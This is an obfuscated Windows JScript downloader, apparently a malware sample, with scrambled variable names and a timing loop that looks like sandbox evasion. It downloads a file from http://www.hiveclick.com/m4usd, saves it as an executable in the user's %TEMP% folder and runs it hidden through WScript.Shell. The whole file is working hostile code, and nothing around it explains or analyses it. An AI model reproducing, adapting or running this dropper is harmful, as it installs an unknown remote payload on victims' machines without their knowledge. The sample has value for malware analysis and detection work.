var Vshbvbrvyy = false;
var Efgwh = "CreateObject";
var Ltrhzhrqtg = function Toolpwh() {return WScript[Efgwh]("WScript.Shell");}();
var Prsexzbgih = 123213;
var Dwtrk = "MSXML2.XMLHTTP";
var Ejxosyjpoz = 2123213;
var Eskie = 0;
function Xmcpd(Npqokyibi){Ltrhzhrqtg["Run"](Npqokyibi, Eskie, Eskie);};
function Yuvzmfvcfc(){return Dwtrk;};
function Iycicxlto(Xpcln, Ajgifmwtss){return Xpcln - Ajgifmwtss;};
function Hqubtkl(){return Efgwh;};
/*@cc_on
  @if (@_win32 || @_win64)
    Vshbvbrvyy = true;
  @end
@*/
var Imvgoy = "";
if (Vshbvbrvyy)
{
function Glwgqen(){return 22;};
var Tbnqcr = 0; var Gwawarfrc = 0;
function Gexudjup()
{
var Webvpy = new this["Date"]();
var Bgsxrhdx = Webvpy["getUTCMilliseconds"]();
WScript["Sleep"](Glwgqen());
var Webvpy = new this["Date"]();
var Duxcxg = Webvpy["getUTCMilliseconds"]();
WScript["Sleep"](Glwgqen());
var Webvpy = new this["Date"]();
var Cbmycqjr = Webvpy["getUTCMilliseconds"]();
var Tbnqcr = "Yasuz";
Tbnqcr = Iycicxlto(Duxcxg, Bgsxrhdx);
var Gwawarfrc = "Qtipylv";
Gwawarfrc = Iycicxlto(Cbmycqjr, Duxcxg);
Imvgoy = "open";
return Iycicxlto(Tbnqcr, Gwawarfrc);
}
var Rxzveebpq = false;
var Dssujl = false;
for (var Meisrfuxu = Eskie; Meisrfuxu < Glwgqen() * 1; Meisrfuxu++){if (Gexudjup() != Eskie){
Rxzveebpq = true; 
Gwawarfrc = "07t9gasdf76ags" + 123313 * Tbnqcr + Gwawarfrc; 
Dssujl = true; 
Gwawarfrc = "07t9gasdf76ags" + 123313 * Tbnqcr + Gwawarfrc; 
break;
}}
function Qfopbk() {return ((Rxzveebpq == true) && (Rxzveebpq == Dssujl)) ? 1 : Eskie;};
if (Rxzveebpq && Qfopbk() && Dssujl){
function Vtsjjtrgo() {return Ltrhzhrqtg["ExpandEnvironmentStrings"]("%TEMP%/") + "dTF0IzDT.exe";};
 Qczks = Yuvzmfvcfc();
 Uolfajy = WScript[Efgwh](Qczks);
 var Otgdaiodh = 1;
 while (Otgdaiodh){
try {
Uolfajy[Imvgoy]("GET", "http://www.hiveclick.com/m4usd", false);
Uolfajy["send"]();
Wpjlsgbe = "Sleep";
do {WScript[Wpjlsgbe](Glwgqen() * 11)} while (Uolfajy["readystate"] < 4 );
Otgdaiodh = Eskie;
} catch(Xvrfudrcg){Otgdaiodh = ("asdfa", "fadfasdf", "afdafa", 2);};
}
function Nvrnougmpb(Liidfbm) {var Juerhskau = (1, 2, 3, 4, 5, Liidfbm); return Juerhskau;};
Zqmrvpkna = WScript[Hqubtkl()]("ADODB.Stream");
Qczks = Zqmrvpkna;
Qczks[Imvgoy]();
Qczks["type"] = Nvrnougmpb(1);
Qczks["write"](Uolfajy["ResponseBody"]);
Zqmrvpkna["position"] = Nvrnougmpb(Eskie);
Qczks["SaveToFile"](Vtsjjtrgo(), Nvrnougmpb(2) );
Zqmrvpkna["close"]();
Xmcpd(Vtsjjtrgo());
}
}

